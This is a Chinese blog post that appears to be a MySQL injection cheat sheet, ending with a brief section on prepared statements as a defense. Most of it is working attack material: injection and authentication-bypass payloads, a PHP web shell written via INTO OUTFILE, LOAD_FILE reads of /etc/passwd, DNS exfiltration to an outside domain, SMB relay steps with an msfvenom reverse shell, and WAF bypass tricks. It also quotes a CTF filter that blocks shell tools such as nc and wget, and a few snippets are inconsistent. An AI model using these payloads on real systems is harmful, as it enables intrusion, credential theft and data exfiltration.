<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>MySQL 注入攻击与防御</title>
    <url>/MySQL%20%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E5%BE%A1/</url>
    <content><![CDATA[<h1 id="MySQL-注入攻击与防御"><a href="#MySQL-注入攻击与防御" class="headerlink" title="MySQL 注入攻击与防御"></a>MySQL 注入攻击与防御</h1><p><code>MySQL 注入攻击与防御</code></p>
<span id="more"></span>



<p><strong>注入常用函数与字符</strong></p>
<p>下面几点是注入中经常会用到的语句</p>
<p>控制语句操作(select, case, if(), …)</p>
<p>比较操作(&#x3D;, like, mod(), …)</p>
<p>字符串的猜解操作(mid(), left(), rpad(), …)</p>
<p>字符串生成操作(0x61, hex(), conv()(使用conv([10-36],10,36)可以实现所有字符的表示))</p>
<p><strong>测试注入</strong></p>
<p>可以用以下语句对一个可能的注入点进行测试</p>
<p>![image-20250113141629565](MySQL 注入攻击与防御&#x2F;image-20250113141629565.png)</p>
<p><strong>注释符</strong></p>
<p>以下是Mysql中可以用到的注释符：</p>
<p>![image-20250113141653328](MySQL 注入攻击与防御&#x2F;image-20250113141653328.png)</p>
<p>Examples:</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> Users <span class="keyword">WHERE</span> username <span class="operator">=</span> <span class="string">&#x27;&#x27;</span> <span class="keyword">OR</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span> <span class="comment">-- -&#x27; AND password = &#x27;&#x27;;</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> Users <span class="keyword">WHERE</span> id <span class="operator">=</span> <span class="string">&#x27;&#x27;</span> <span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>`<span class="string">&#x27;;</span></span><br></pre></td></tr></table></figure>



<p><strong>版本&amp;主机名&amp;用户&amp;库名</strong></p>
<p>![image-20250113141704543](MySQL 注入攻击与防御&#x2F;image-20250113141704543.png)</p>
<p><strong>表和字段</strong></p>
<p><strong>确定字段数</strong></p>
<p><strong>ORDER BY</strong></p>
<p>ORDER BY用于判断表中的字段个数</p>
<p>![image-20250113141715724](MySQL 注入攻击与防御&#x2F;image-20250113141715724.png)</p>
<p><strong>SELECT … INTO</strong></p>
<p>关于SELECT … INTO 的解释可以看这一篇文章<a href="http://www.w3school.com.cn/sql/sql_select_into.asp">SELECT … INTO解释</a></p>
<p>![image-20250113141735860](MySQL 注入攻击与防御&#x2F;image-20250113141735860.png)</p>
<p>当出现LIMIT时可以用以下语句：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">SELECT username FROM Users <span class="built_in">limit</span> 1,&#123;INJECTION POINT&#125;;</span><br></pre></td></tr></table></figure>

<p>![image-20250113141730952](MySQL 注入攻击与防御&#x2F;image-20250113141730952.png)</p>
<p><strong>判断已知表名的字段数</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">AND</span> (SELECT * FROM SOME_EXISTING_TABLE) = <span class="number">1</span></span><br><span class="line">SELECT passwd FROM Users WHERE id = &#123;INJECTION POINT&#125;;</span><br></pre></td></tr></table></figure>

<p>![1736749063727](MySQL 注入攻击与防御&#x2F;1736749063727-1736749178899-9.png)</p>
<p><strong>查表名</strong></p>
<p>以下提过几种方式对库中表进行查询</p>
<p>![1736749068930](MySQL 注入攻击与防御&#x2F;1736749068930.png)</p>
<p><strong>查列名</strong></p>
<p>以下提过几种方式对表中列进行查询</p>
<p>![image-20250113141840771](MySQL 注入攻击与防御&#x2F;image-20250113141840771.png)</p>
<p><strong>字符串连接</strong></p>
<p>下面的几条语句都可以用以连接字符</p>
<p>![image-20250113141831068](MySQL 注入攻击与防御&#x2F;image-20250113141831068.png)</p>
<p><strong>条件语句&amp;时间函数</strong></p>
<p>![image-20250113142105661](MySQL 注入攻击与防御&#x2F;image-20250113142105661.png)</p>
<p>其中BENCHMARK函数是指执行某函数的次数，次数多时能够达到与sleep函数相同的效果</p>
<p><strong>文件操作</strong></p>
<p><strong>文件操作权限</strong></p>
<p>在MySQL中，存在一个称为secure_file_priv的全局系统变量。 该变量用于限制数据的导入和导出操作，例如SELECT … INTO OUTFILE语句和LOAD_FILE()</p>
<p>如果secure_file_priv变量为空那么直接可以使用函数,如果为null是不能使用</p>
<p>但在mysql的5.5.53之前的版本是默认为空,之后的版本为null,所有是将这个功能禁掉了</p>
<p>![image-20250113142144464](MySQL 注入攻击与防御&#x2F;image-20250113142144464.png)</p>
<p>也可使用如下语句查询</p>
<p>![image-20250113142155695](MySQL 注入攻击与防御&#x2F;image-20250113142155695.png)</p>
<p><strong>读文件</strong></p>
<p>读文件函数LOAD_FILE()</p>
<p>Examples:</p>
<figure class="highlight scss"><table><tr><td class="code"><pre><span class="line">SELECT <span class="built_in">LOAD_FILE</span>(&#x27;/etc/passwd&#x27;);</span><br><span class="line">SELECT <span class="built_in">LOAD_FILE</span>(<span class="number">0</span>x2F6574632F706173737764);</span><br></pre></td></tr></table></figure>

<p>注意点： </p>
<ol>
<li>LOAD_FILE的默认目录@@datadir </li>
<li>文件必须是当前用户可读 </li>
<li>读文件最大的为1047552个byte, @@max_allowed_packet可以查看文件读取最大值</li>
</ol>
<p><strong>写文件</strong></p>
<p>INTO OUTFILE&#x2F;DUMPFILE</p>
<p>经典写文件例子：</p>
<p>To write a PHP shell:</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="string">&#x27;&lt;? system($_GET[&#x27;</span>c<span class="string">&#x27;]); ?&gt;&#x27;</span> <span class="keyword">INTO</span> OUTFILE <span class="string">&#x27;/var/www/shell.php&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>这两个函数都可以写文件，但是有很大的差别 </p>
<p>INTO OUTFILE函数写文件时会在每一行的结束自动加上换行符 </p>
<p>INTO DUMPFILE函数在写文件会保持文件得到原生内容，这种方式对于二进制文件是最好的选择 </p>
<p>当我们在UDF提权的场景是需要上传二进制文件等等用OUTFILE函数是不能成功的 </p>
<p>网上有很多文章介绍，比如<a href="http://www.cnblogs.com/milantgh/p/5444398.html">这篇</a></p>
<p>注意点： </p>
<ol>
<li>INTO OUTFILE不会覆盖文件 </li>
<li>INTO OUTFILE必须是查询语句的最后一句 </li>
<li>路径名是不能编码的，必须使用单引号</li>
</ol>
<p><strong>带外通道</strong></p>
<p>关于带外通道的注入前段时间国外的大佬已经总结过了，我基本复现了一下，博客有文章，这里简单提一下</p>
<p><strong>什么是带外通道注入？</strong></p>
<p>带外通道攻击主要是利用其他协议或者渠道从服务器提取数据. 它可能是HTTP（S）请求，DNS解析服务，SMB服务，Mail服务等.</p>
<p><strong>条件限制</strong></p>
<p>首先不用多说,这些函数是需要绝对路径的</p>
<p>如果secure_file_priv变量为空那么直接可以使用函数,如果为null是不能使用</p>
<p>但在mysql的5.5.53之前的版本是默认为空,之后的版本为null,所有是将这个功能禁掉了</p>
<p><strong>DNS注入</strong></p>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line"><span class="built_in">select</span> load_file(<span class="built_in">concat</span>(<span class="string">&#x27;\\&#x27;</span>,version(),<span class="string">&#x27;.rootclay.club\clay.txt&#x27;</span>));</span><br><span class="line"><span class="built_in">select</span> load_file(<span class="built_in">concat</span>(<span class="number">0x5c5c5c5c</span>,version(),<span class="number">0x2e6861636b65722e736974655c5c612e747874</span>));</span><br></pre></td></tr></table></figure>

<p>上面的语句执行的结果我们可以通过wireshark抓包看一下，过滤一下DNS协议即可清晰看到数据出去的样子，如下图</p>
<p>![image-20250113142207494](MySQL 注入攻击与防御&#x2F;image-20250113142207494.png)</p>
<p>进行DNS注入需要域名解析，自己有的话最好，但是没有的朋友也没事，这里推荐一个网站CEYE可以查看数据</p>
<p><strong>SMB Relay 注入攻击</strong></p>
<p><strong>What is SMB relay</strong></p>
<p>这里简单的描述一下SMB relay这个过程</p>
<p>假设有主机B与A </p>
<p>(1) A向B发起连接请求 </p>
<p>(2) B向A发送挑战(一组随机数据，8字节) </p>
<p>(3) A用源自明文口令的DESKEY对挑战进行标准DES加密得到响应，并发往B </p>
<p>(4) B从SAM中获取A的LM Hash、NTLM Hash，计算出DESKEY，并对前面发往A的挑战进 </p>
<p>行标准DES加密 </p>
<p>(5) 如果(4)中计算结果与A送过来的响应匹配，A被允许访问B </p>
<p>现在假设一个攻击者C卷入其中 </p>
<p>(1) C向B发起连接请求 </p>
<p>(2) B向C发送挑战D(一组随机数据) </p>
<p>(3) C等待A向B发起连接请求 </p>
<p>(4) 当A向B发起连接请求时，C伪造成B向A发送挑战D </p>
<p>(5) A用源自明文口令的DESKEY对挑战D进行标准DES加密得到响应E，并发往B </p>
<p>(6) C截获到响应E，将它做为针对(2)中挑战D的响应发往B，并声称自己是A </p>
<p>(7) B从SAM中获取A的LM Hash、NTLM Hash，计算出DESKEY，并对挑战D进行标准DES </p>
<p>加密 </p>
<p>(8) 如果(7)中计算结果与C送过来的响应匹配，C被允许以A的身份访问B。</p>
<p><strong>攻击流程</strong></p>
<p>![image-20250113142217112](MySQL 注入攻击与防御&#x2F;image-20250113142217112.png)</p>
<p>关于SMB relay攻击窃取NTML与shell请看这篇文章<a href="http://pen-testing.sans.org/blog/pen-testing/2013/04/25/smb-relay-demystified-and-ntlmv2-pwnage-with-python">SMB Relay Demystified and NTLMv2 Pwnage with Python</a></p>
<p>整理了一下实际操作的步骤如下: </p>
<ol>
<li>首先生成一个反向shell:</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=攻击机ip LPORT=攻击机监听端口 -f exe &gt; reverse_shell.exe</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>运行<a href="https://github.com/CoreSecurity/impacket">smbrelayx</a>，指定被攻击者和生成的反向shell，等待连接。</li>
</ol>
<p>smbrelayx.py -h 被攻击者ip -e 反向shell文件位置 </p>
<ol start="3">
<li>使用模块multi&#x2F;handler。侦听攻击机ip,攻击机监听端口 </li>
<li>在MySQL Server上运行如下的代码，则会产生shell。相当于访问攻击机的smb服务,但实际上是窃取了mysql_server的身份</li>
</ol>
<figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">select</span> <span class="title">load_file</span>(<span class="params"><span class="string">&#x27;\攻击机ipaa&#x27;</span></span>)</span>;</span><br></pre></td></tr></table></figure>



<p><strong>绕过技巧</strong></p>
<p><strong>绕过单引号</strong></p>
<p>![image-20250113142226374](MySQL 注入攻击与防御&#x2F;image-20250113142226374.png)</p>
<p><strong>大小写绕过</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="operator">+</span><span class="keyword">UnIoN</span><span class="operator">+</span><span class="keyword">SeLecT</span><span class="operator">+</span><span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span><span class="comment">--</span></span><br></pre></td></tr></table></figure>

<p><strong>替换绕过</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?<span class="built_in">id</span>=1+UNunionION+SEselectLECT+1,2,3--</span><br></pre></td></tr></table></figure>

<p><strong>注释绕过</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?<span class="built_in">id</span>=1+un/**/ion+se/**/lect+1,2,3--</span><br></pre></td></tr></table></figure>

<p><strong>特殊嵌入绕过</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="comment">/*!UnIoN*/</span><span class="keyword">SeLecT</span><span class="operator">+</span><span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span><span class="comment">--</span></span><br></pre></td></tr></table></figure>

<p><strong>宽字节注入</strong></p>
<p>SQL注入中的宽字节国内最常使用的gbk编码，这种方式主要是绕过addslashes等对特殊字符进行转移的绕过。反斜杠()的十六进制为%5c，在你输入%bf%27时，函数遇到单引号自动转移加入，此时变为%bf%5c%27，%bf%5c在gbk中变为一个宽字符“縗”。%bf那个位置可以是%81-%fe中间的任何字符。不止在sql注入中，宽字符注入在很多地方都可以应用。</p>
<p><strong>MySQL版本号字符</strong></p>
<p>Examples:</p>
<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">span</span>&gt;</span></span>UNION SELECT /<span class="emphasis">*!50000 5,null;%00*</span>//<span class="emphasis">*!40000 4,null-- ,*</span>//<span class="emphasis">*!30000 3,null-- x*</span>/0,null--+<span class="language-xml"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span>SELECT 1/<span class="emphasis">*!41320UNION/*</span>!/<span class="emphasis">*!/*</span>!00000SELECT/<span class="emphasis">*!/*</span>!USER/<span class="emphasis">*!(/*</span>!/<span class="emphasis">*!/*</span>!<span class="emphasis">*/);<span class="language-xml"><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span></span><br></pre></td></tr></table></figure>

<p>这样的查询语句是可以执行的，我理解为类似Python中第一行注释指定解析器一样#!&#x2F;bin&#x2F;sh</p>
<p>对于小于或等于版本号的语句就会执行</p>
<p>例如目前的Mysql版本为5.7.17那么&#x2F;!50717&#x2F;及其以下的语句即可执行</p>
<p><strong>字符编码绕过</strong></p>
<p>前段时间看到ph师傅的博客是讨论mysql字符编码的文章，大概意思如下，原文在<a href="https://www.leavesongs.com/PENETRATION/mysql-charset-trick.html">这里 </a></p>
<p>当出现有以下代码时，指设置了字符编码为utf-8，但并不是全部为utf-8，而在具体的转换过程中会出现意外的情况，具体可以看ph师傅的文章</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$mysqli</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&quot;set names utf8&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>在sql查询中</p>
<p>test.php?username&#x3D;admin%e4中的%e4会被admin忽略掉而绕过了一些逻辑，还有一些类似于$e4这样的字符如%c2等</p>
<p><strong>绕空格</strong></p>
<p><strong>特殊字符绕过空格</strong></p>
<p>![image-20250113142237156](MySQL 注入攻击与防御&#x2F;image-20250113142237156.png)</p>
<p>Example:</p>
<figure class="highlight vbnet"><table><tr><td class="code"><pre><span class="line"><span class="comment">&#x27;%0AUNION%0CSELECT%A0NULL%20%23</span></span><br></pre></td></tr></table></figure>

<p><strong>括号绕过空格</strong></p>
<p>![image-20250113142244887](MySQL 注入攻击与防御&#x2F;image-20250113142244887.png)</p>
<p>Example:</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">UNION</span>(<span class="keyword">SELECT</span>(<span class="keyword">column</span>)<span class="keyword">FROM</span>(<span class="keyword">table</span>))</span><br></pre></td></tr></table></figure>

<p><strong>and&#x2F;or后插入字符绕过空格</strong></p>
<p>任意混合+ – ~ !可以达到绕过空格的效果（可以现在本地测试，混合后需要的奇偶数可能不同）</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">DISTINCT</span>(db) <span class="keyword">FROM</span> mysql.db <span class="keyword">WHERE</span> `Host`<span class="operator">=</span><span class="string">&#x27;localhost&#x27;</span> <span class="keyword">and</span><span class="operator">-</span><span class="operator">+</span><span class="operator">+</span><span class="number">-1</span><span class="operator">=</span><span class="number">1</span>;需要偶数个<span class="comment">--</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">DISTINCT</span>(db) <span class="keyword">FROM</span> mysql.db <span class="keyword">WHERE</span> `Host`<span class="operator">=</span><span class="string">&#x27;localhost&#x27;</span> <span class="keyword">and</span><span class="operator">!</span><span class="operator">!</span><span class="operator">~</span><span class="operator">~</span><span class="operator">~</span><span class="operator">~</span><span class="operator">!</span><span class="number">1</span><span class="operator">=</span><span class="number">1</span>;需要奇数个！</span><br></pre></td></tr></table></figure>

<p>其实一下的字符都可以测试</p>
<p>![image-20250113142254149](MySQL 注入攻击与防御&#x2F;image-20250113142254149.png)</p>
<p><strong>注释符&amp;引号</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">DISTINCT</span>(db) <span class="keyword">FROM</span> mysql.db <span class="keyword">WHERE</span> `Host`<span class="operator">=</span><span class="string">&#x27;localhost&#x27;</span> <span class="keyword">and</span><span class="comment">/**/</span><span class="number">1</span><span class="operator">=</span><span class="number">1</span>;</span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">DISTINCT</span>(db) <span class="keyword">FROM</span> mysql.db <span class="keyword">WHERE</span> `Host`<span class="operator">=</span><span class="string">&#x27;localhost&#x27;</span> <span class="keyword">and</span>&quot;1=1&quot;;</span><br></pre></td></tr></table></figure>

<p><strong>编码绕过</strong></p>
<p>![image-20250113142311014](MySQL 注入攻击与防御&#x2F;image-20250113142311014.png)</p>
<p><strong>关键字绕过</strong></p>
<p>测试用例information_schema.tables</p>
<p>![image-20250113142326984](MySQL 注入攻击与防御&#x2F;image-20250113142326984.png)</p>
<p><strong>认证绕过</strong></p>
<p>绕过语句：’&#x3D;’</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> data <span class="keyword">from</span> users <span class="keyword">where</span> name<span class="operator">=</span>&quot;=&quot;</span><br><span class="line"><span class="keyword">select</span> data <span class="keyword">from</span> users <span class="keyword">where</span> flase<span class="operator">=</span>&quot;</span><br><span class="line">select data from users where 0=0</span><br></pre></td></tr></table></figure>

<p>绕过语句：’-‘</p>
<figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> data <span class="keyword">from</span> users <span class="keyword">where</span> name=<span class="string">&#x27;&#x27;</span>-<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">select</span> data <span class="keyword">from</span> users <span class="keyword">where</span> name=<span class="number">0</span><span class="number">-0</span></span><br><span class="line"><span class="keyword">select</span> data <span class="keyword">from</span> users <span class="keyword">where</span> <span class="number">0</span>=<span class="number">0</span></span><br></pre></td></tr></table></figure>

<p>比如登录的时候需要输入email和passwd，可以这样输入</p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">email</span>=<span class="string">&#x27;&#x27;</span>&amp;password=<span class="string">&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<p>类型转换</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27; or 1=true</span></span><br><span class="line"><span class="string">&#x27;</span> <span class="keyword">or</span> <span class="number">1</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> <span class="string">&#x27;a&#x27;</span><span class="operator">=</span><span class="string">&#x27;b&#x27;</span><span class="operator">=</span><span class="string">&#x27;c&#x27;</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> (<span class="string">&#x27;a&#x27;</span><span class="operator">=</span><span class="string">&#x27;b&#x27;</span>)<span class="operator">=</span><span class="string">&#x27;c&#x27;</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> (<span class="literal">false</span>)<span class="operator">=</span><span class="string">&#x27;c&#x27;</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> (<span class="number">0</span>)<span class="operator">=</span><span class="string">&#x27;c&#x27;</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> (<span class="number">0</span>)<span class="operator">=</span><span class="number">0</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> <span class="literal">true</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users</span><br></pre></td></tr></table></figure>

<p>我们还有关于此的漏洞，就以一次CTF的题目来说(源码如下)：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">fiter</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$order</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">sql_clean</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(<span class="variable">$str</span>))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt; alert(&#x27;not array!!@_@&#x27;);parent.location.href=&#x27;index.php&#x27;; &lt;/script&gt;&quot;</span>;<span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$filter</span> = <span class="string">&quot;/ |*|#|,|union|like|regexp|for|and|or|file|--|||`|&amp;|&quot;</span>.<span class="title function_ invoke__">urldecode</span>(<span class="string">&#x27;%09&#x27;</span>).<span class="string">&quot;|&quot;</span>.<span class="title function_ invoke__">urldecode</span>(<span class="string">&quot;%0a&quot;</span>).<span class="string">&quot;|&quot;</span>.<span class="title function_ invoke__">urldecode</span>(<span class="string">&quot;%0b&quot;</span>).<span class="string">&quot;|&quot;</span>.<span class="title function_ invoke__">urldecode</span>(<span class="string">&#x27;%0c&#x27;</span>).<span class="string">&quot;|&quot;</span>.<span class="title function_ invoke__">urldecode</span>(<span class="string">&#x27;%0d&#x27;</span>).<span class="string">&quot;/i&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="variable">$filter</span>,<span class="variable">$str</span>))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt; alert(&#x27;illegal character!!@_@&#x27;);parent.location.href=&#x27;index.php&#x27;; &lt;/script&gt;&quot;</span>;<span class="keyword">exit</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="title function_ invoke__">strrpos</span>(<span class="variable">$str</span>,<span class="title function_ invoke__">urldecode</span>(<span class="string">&quot;%00&quot;</span>)))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt; alert(&#x27;illegal character!!@_@&#x27;);parent.location.href=&#x27;index.php&#x27;; &lt;/script&gt;&quot;</span>;<span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;str=<span class="variable">$str</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">ord_clean</span>(<span class="params"><span class="variable">$ord</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$filter</span> = <span class="string">&quot; |bash|perl|nc|java|php|&gt;|&gt;&gt;|wget|ftp|python|sh&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/&quot;</span>.<span class="variable">$filter</span>.<span class="string">&quot;/i&quot;</span>,<span class="variable">$ord</span>) == <span class="number">1</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;order = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;order = <span class="variable">$ord</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里过滤了很多关键词了，需要用到类型转换了，这里我们用+号</p>
<p>Payload如下：</p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">uname</span>=aa<span class="string">&#x27;+(ascii(mid((passwd)from(1)))&gt;0)+&#x27;</span><span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>执行的SQL语句如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">xxxxxx <span class="built_in">where</span> username = <span class="string">&#x27;aa&#x27;</span>+(ascii(mid((passwd)from(users)))&gt;0)+<span class="string">&#x27;1&#x27;</span></span><br></pre></td></tr></table></figure>

<p>这样就可以开始写脚本跑数据了</p>
<p>除了＋号，其他算术操作符号也会发生类型的类型转换，例如MOD，DIV，＊，／，％，－， </p>
<p>关于隐式类型转换的文章可以看<a href="http://www.freebuf.com/articles/web/8773.html">这里</a></p>
<p><strong>HTTP参数污染</strong></p>
<p>当我们传入的参数为</p>
<p><a href="http://sqlinjection.com/?par1=val1&par1=val2">http://sqlinjection.com/?par1=val1&amp;par1=val2</a></p>
<p>进入到不同的Web Server就可能得到不同的结果，这里借鉴一下国外大佬一篇文章的总结，如下：</p>
<p>![image-20250113142348871](MySQL 注入攻击与防御&#x2F;image-20250113142348871.png)</p>
<p>不同的web server的处理结果截然不同</p>
<p>![image-20250113142411929](MySQL 注入攻击与防御&#x2F;image-20250113142411929.png)</p>
<p>这里也推荐一篇国外的<a href="http://www.blackhat.com/presentations/bh-usa-09/DZULFAKAR/BHUSA09-Dzulfakar-MySQLExploit-SLIDES.pdf">文章</a></p>
<p><strong>实战正则过滤绕过</strong></p>
<p>![image-20250113142422398](MySQL 注入攻击与防御&#x2F;image-20250113142422398.png)</p>
<p><strong>防御手段(代码以PHP为例)</strong></p>
<p>像WAF之类防御手段自己无能为力经常打补丁就好，这里主要提一下代码层面的问题 </p>
<p>推荐使用下面的方式进行查询：</p>
<p><strong>MYSQLi</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$stmt</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&#x27;update name set name = ? where id = ?&#x27;</span>);</span><br><span class="line"><span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bind_param</span>(<span class="string">&#x27;si&#x27;</span>,<span class="variable">$name</span>,<span class="variable">$id</span>);</span><br><span class="line"><span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br></pre></td></tr></table></figure>

<p><strong>ODBC</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$stmt</span> = <span class="title function_ invoke__">odbc_prepare</span>( <span class="variable">$conn</span>, <span class="string">&#x27;SELECT * FROM users WHERE email = ?&#x27;</span> );</span><br><span class="line"><span class="variable">$success</span> = <span class="title function_ invoke__">odbc_execute</span>( <span class="variable">$stmt</span>, <span class="keyword">array</span>(<span class="variable">$email</span>) );</span><br></pre></td></tr></table></figure>

<p>或者</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$dbh</span> = <span class="title function_ invoke__">odbc_exec</span>(<span class="variable">$conn</span>, <span class="string">&#x27;SELECT * FROM users WHERE email = ?&#x27;</span>, <span class="keyword">array</span>(<span class="variable">$email</span>));</span><br><span class="line"><span class="variable">$sth</span> = <span class="variable">$dbh</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&#x27;SELECT * FROM users WHERE email = :email&#x27;</span>);</span><br><span class="line"><span class="variable">$sth</span>-&gt;<span class="title function_ invoke__">execute</span>(<span class="keyword">array</span>(<span class="string">&#x27;:email&#x27;</span> =&gt; <span class="variable">$email</span>));</span><br></pre></td></tr></table></figure>

<p><strong>PDO</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$dbh</span> = <span class="keyword">new</span> <span class="title function_ invoke__">PDO</span>(<span class="string">&#x27;mysql:dbname=testdb;host=127.0.0.1&#x27;</span>, <span class="variable">$user</span>, <span class="variable">$password</span>);</span><br><span class="line"><span class="variable">$stmt</span> = <span class="variable">$dbh</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&#x27;INSERT INTO REGISTRY (name, value) VALUES (:name, :value)&#x27;</span>);</span><br><span class="line"><span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bindParam</span>(<span class="string">&#x27;:name&#x27;</span>, <span class="variable">$name</span>);</span><br><span class="line"><span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bindParam</span>(<span class="string">&#x27;:value&#x27;</span>, <span class="variable">$value</span>);</span><br><span class="line"><span class="comment">// insert one row</span></span><br><span class="line"><span class="variable">$name</span> = <span class="string">&#x27;one&#x27;</span>;</span><br><span class="line"><span class="variable">$value</span> = <span class="number">1</span>;</span><br><span class="line"><span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br></pre></td></tr></table></figure>

<p>或者</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$dbh</span> = <span class="keyword">new</span> <span class="title function_ invoke__">PDO</span>(<span class="string">&#x27;mysql:dbname=testdb;host=127.0.0.1&#x27;</span>, <span class="variable">$user</span>, <span class="variable">$password</span>);</span><br><span class="line"><span class="variable">$stmt</span> = <span class="variable">$dbh</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&#x27;UPDATE people SET name = :new_name WHERE id = :id&#x27;</span>);</span><br><span class="line"><span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>( <span class="keyword">array</span>(<span class="string">&#x27;new_name&#x27;</span> =&gt; <span class="variable">$name</span>, <span class="string">&#x27;id&#x27;</span> =&gt; <span class="variable">$id</span>) );</span><br></pre></td></tr></table></figure>

<p><strong>框架</strong></p>
<p>对于框架的话只要遵循框架的API就好，例如wp的查询</p>
